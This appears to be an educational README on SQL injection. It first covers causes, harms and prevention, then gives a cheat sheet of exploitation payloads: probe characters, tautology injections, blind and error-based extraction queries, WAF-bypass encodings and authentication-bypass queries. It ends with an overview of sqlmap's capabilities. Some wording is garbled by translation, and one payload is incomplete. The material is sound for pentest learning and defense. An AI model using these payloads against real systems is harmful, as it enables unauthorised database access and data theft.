# Introduce about SQL INJECTIONL

**1. What is SQL injection?**
- SQL injection attacks are a common web vulnerability. It refers to accessing, modifying or deleting sensitive data in a database without permission by constructing malicious SQL statements

- SQL injection attacks often occur in web applications that use dynamic SQL statements, especially when the web application allows users to enter certain data. If data is not properly verified and read, it can lead to SQL injection attacks. Attackers can use this vulnerability to construct malicious SQL statements, access, modify or delete data in the database, and even take complete control of the database.
- To prevent SQL injection attacks, web developers should implement strict validation and filtering of user-entered data and use secure programming methods, such as using queries parameterized service


\
**2. Origin of SQL injection**\
SQL injection attacks are caused by security vulnerabilities in the design and development of web applications.
Specific reasons are as follows:
* Insecure String Concatenation: Web applications can use insecure string concatenation technology to directly concatenate user-entered data into SQL statements, leading to SQL injection attacks.
* Lack of input validation: Web applications may ineffectively validate user-input data, allowing users to submit arbitrary SQL code, leading to SQL injection attacks.
* Ignoring error information: The web application may not be able to handle database error information, causing database error information to leak, leading to SQL injection attacks.
* Insecure configuration: Databases can have insecure configurations, such as using default administrator accounts and passwords, leading to SQL injection attacks.

**3.The dangers of SQL injection**\
SQL injection attacks can cause the following harmful effects:
1. Sensitive information leak: Attackers can use SQL injection attacks to read sensitive information in the database, such as user passwords, personal information, etc.
2. Data destruction: Attackers can use SQL injection attacks to modify and delete data in the database, destroying data consistency and integrity.
3. Database Control: An attacker can gain complete control of a web application by gaining full control of the database through a SQL injection attack.
4. Cyber ​​attacks: Attackers can use SQL injection attacks to cause the database to execute malicious code, thereby conducting cyber attacks, such as launching DDoS attacks .
5. Business Impact: SQL injection attacks can cripple web applications and severely impact normal business operations.

\
**4. SQL injection prevention**\
There are several ways to prevent SQL injection attacks:
1. Filter and verify user input: Filter input data and remove all unsafe characters, such as parentheses, semicolons, etc.
2. Use parameterized queries: Using parameterized queries (such as ReadyStatements) instead of directly concatenating SQL statements can effectively prevent SQL injection attacks fruit.
3. Limit user permissions: Limit user permissions and grant only necessary permissions, which reduces the actions an attacker can perform.
4. Configure database security: Configure database security, such as enabling database logs, using walls
fire, etc., to prevent attackers from attacking the database.
5. Conduct regular code reviews: Conduct regular code reviews to detect and fix vulnerabilities in the code.


# EXPLOIT SQL VULNERABILITIES

**1. Entry point detection**\
Several methods to exit the current context are usually available
```
'
"
`
')
")
`)
'))
"))
`))
```


If the server responds strangely, this site will be vulnerable to SQL injection (SQLi) and there will be trouble.\
Note: comment is used

```
- - comments
 or
/*comment*/
```
**2. Confirming with logical operations**\
A reliable method to confirm an SQL injection vulnerability involves executing a logical operation and observing the expected outcomes. \
For instance, a GET parameter such as *?username=Peter* yielding identical content when modified to ?*username=Peter' or'1'='1* indicates a SQL injection vulnerability.\
Similarly, the application of mathematical operations serves as an effective confirmation technique. \
For example, if accessing *?id=1* and *?id=2-1* produce the same result, it's indicative of SQL injection.
Examples demonstrating logical operation confirmation:

> page.asp?id=1 or 1=1 -- results in true
> 
> page.asp?id=1' or 1=1 -- results in true
> 
> page.asp?id=1" or 1=1 -- results in true
> 
> page.asp?id=1 and 1=2 -- results in false

**3. List Bypass**\
[Here](https://book.hacktricks.xyz/pentesting-web/login-bypass/sql-login-bypass)

**4. Exploiting Blind SQLi**


In this case you cannot see the results of the query or the errors, but you can distinguished when the query return a true or a false response because there are different contents on the page.\
In this case, you can abuse that behavior to dump the database char by char:
> ?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'


**5. Exploiting Error Blind SQLi**
This is the same case as before but instead of distinguish between a true/false response from the query you can distinguish between an error in the SQL query or not (maybe because the HTTP server crashes).\
Therefore, in this case you can force an SQLerror each time you guess correctly the char:

> AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'

**6. WAF Bypass**\
***No spaces bypass***

No Space (%20) - bypass using whitespace alternatives
> 
> ?id=1%09and%091=1%09--
> 
> ?id=1%0Dand%0D1=1%0D--
> 
> ?id=1%0Cand%0C1=1%0C--
> 
> ?id=1%0Band%0B1=1%0B--
> 
> ?id=1%0Aand%0A1=1%0A--
> 
> ?id=1%A0and%A01=1%A0--

No Whitespace - bypass using comments

> ?id=1/*comment*/and/**/1=1/**/--

No Whitespace - bypass using parenthesis

> ?id=(1)and(1)=(1)--

***No commas bypass***\
No Comma - bypass using OFFSET, FROM and JOIN

> LIMIT 0,1         -> LIMIT 1 OFFSET 0
> 
> SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
> 
> SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d

***Generic Bypasses***\
Blacklist using keywords - bypass using uppercase/lowercase
> 
> ?id=1 AND 1=1#
> 
> ?id=1 AnD 1=1#
> 
> ?id=1 aNd 1=1#

Blacklist using keywords case insensitive - bypass using an equivalent operator
> 
> AND   -> && -> %26%26
> 
> OR    -> || -> %7C%7C
> 
> =     -> LIKE,REGEXP,RLIKE, not < and not >
> 
> > X   -> not between 0 and X
> 
> WHERE -> HAVING --> LIMIT X,1 -> group_concat(CASE(table_schema)When(database())

***Authentication bypass ‘=’***
> select * from users where name = ”=”
> select * from users where false = ”
> select * from users where 0 = 0
> select * from users where true
> select * from users

***Authentication bypass ‘-‘***
> select * from users where name = ”-”
> select * from users where name = 0-0
> select * from users where 0 = 0
> select * from users where true
> select * from users


# Automated Exploitation
A quite useful tool to exploit a SQLi vulnerability is sqlmap

SQLMAP is a tool to exploit SQL database vulnerabilities. This is a very powerful tool and is often trusted by hackers. It is built into Kali, which is an open source tool that automates the process of detecting and exploiting SQL vulnerabilities with the following features:
* Full support for working with database management systems MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase, SAP MaxDB, Informix, MariaDB, MemSQL, TiDB, CockroachDB, ...
* Full support for SQL Injection attack techniques: boolean-based blind, time-based blind, error-based, UNION query-based, stacked queries and out-of-band
* Connect directly to the database without going through SQL Server, by providing DBMS credentials, IP address, port and database name.
* List users, password hashes, privileges, roles, databases, tables and columns.
* Automatically recognizes password hash formats and supports cracking them using a dictionary-based attack.
* Extract complete database tables, a series of entries, or specific columns of the user's choice
* Search for specific database names, specific tables across all databases, or specific columns across all database tables\
Download and upload any files from the database server underlying the file system when the database software is MySQL, PostgreSQL, or Microsoft SQL Server.\
Execute arbitrary commands and retrieve their standard output on the database server underlying the operating system when the database software is MySQL, PostgreSQL, or Microsoft SQL Server\
-> Way to use: [here](https://github.com/sqlmapproject/sqlmap/wiki/Usage)

